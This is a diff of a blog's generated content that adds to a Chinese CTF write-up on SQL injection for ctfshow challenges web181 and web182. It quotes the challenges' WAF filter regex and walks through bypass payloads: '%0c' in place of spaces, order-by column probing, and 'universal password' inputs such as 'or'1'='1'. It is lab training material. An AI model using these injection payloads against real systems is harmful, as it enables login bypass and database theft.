@@ -8354,7 +8354,8 @@
 <h2 id="2-bypass技巧"><a href="#2-bypass技巧" class="headerlink" title="2.bypass技巧"></a>2.bypass技巧</h2><h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><h4 id="大小写绕过，双写绕过"><a href="#大小写绕过，双写绕过" class="headerlink" title="大小写绕过，双写绕过"></a>大小写绕过，双写绕过</h4><h4 id="注释符-关键字绕过"><a href="#注释符-关键字绕过" class="headerlink" title="注释符(关键字绕过)"></a>注释符(关键字绕过)</h4><p>比如用<code>unio&lt;&gt;n</code>代替union，用<code>se/**/lect</code>代替select</p>
 <h4 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h4><p>我们可以用”||”1、” or “1”&#x3D;”1，甚至是”union select 1,2,”3进行闭合</p>
 <h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><p>编码绕过:%20 %09 %0a %0b %0c %0d %a0 %00</p>
-<p>内联注释:&#x2F;**&#x2F; &#x2F;<em>字符串</em>&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内联注释:/**/ /*字符串*/</span><br></pre></td></tr></table></figure>
+
 <p>括号绕过:即添加括号代替空格，比如我们的正常语句为<code>SELECT 用户名 FROM </code>sheet1&#96;&#96;，现在我们就可以改成<code>SELECT(用户名)FROM(</code>sheet1<code>)</code></p>
 <h4 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h4><p>转为16进制字符串，这样就不用使用引号</p>
 <h4 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h4><h5 id="from-to"><a href="#from-to" class="headerlink" title="from to"></a>from to</h5><p>盲注的时候为了截取字符串，我们往往会使用substr(),mid()。这些子句方法都需要使用到逗号，对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
@@ -8572,7 +8573,18 @@
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206172054640.png" alt="image-20241206172054640"></p>
 <p>目录下的xplatform.txt，然后就可以进行爆破了，然后可以根据response包去判断哪些字符是被过滤了哪些字符能用</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206173227672.png" alt="image-20241206173227672"></p>
-<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>开始nosql了</p>
+<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><h3 id="万能密码及其变式解题"><a href="#万能密码及其变式解题" class="headerlink" title="#万能密码及其变式解题"></a>#万能密码及其变式解题</h3><p>这里的waf终于给出了语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析一下过滤了什么</p>
+<p>空格（<code> </code>）星号（<code>*</code>）制表符（<code>\x09</code>）换行符（<code>\x0a</code>）回车符（<code>\x0b</code>）换页符（<code>\x0c</code>）空字符（<code>\x00</code>）回车换行符（<code>\x0d</code>）非断行空格（<code>\xa0</code>）数字符号（<code>\x23</code> 或 <code>#</code>）单词 <code>file</code>单词 <code>into</code>单词 <code>select</code></p>
+<p>知道过滤了什么就试着去注入一下吧</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>‘回显出错，判断存在注入点</span><br><span class="line">原句是</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">因为空格被过滤了，我们试着绕过空格过滤，测试后发现<span class="operator">%</span><span class="number">0</span>c可以打得通，所以这道题告诉我们，真实的过滤还是得通过自己测试才知道，有时候题目给出来的也可能是障眼法，当然也可能是出题人的疏漏</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0cand&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>返回正确</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0cand%0c&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>返回错误，判断是字符型注入</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0corder%0cby%0c3--%01正常</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="operator">%</span><span class="number">0</span>corder<span class="operator">%</span><span class="number">0</span>cby<span class="operator">%</span><span class="number">0</span>c4<span class="comment">--%01错误，说明字段数是3</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0cunion%0cseselectlect%0c1,2,3--%01显示无数据，说明双写不能绕过这个验证</span></span><br><span class="line"><span class="string">我们这里因为过滤了select语句，我们可以试一下万能密码</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">--%0c</span></span><br><span class="line">或者也可以构造其他的变式</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;||username=&#x27;</span>flag</span><br><span class="line">这些方法有时候也是一种解题的方法</span><br></pre></td></tr></table></figure>
+
+<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次flag被禁了，不过万能密码还是可以做的</p>
+<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>开始nosql了</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
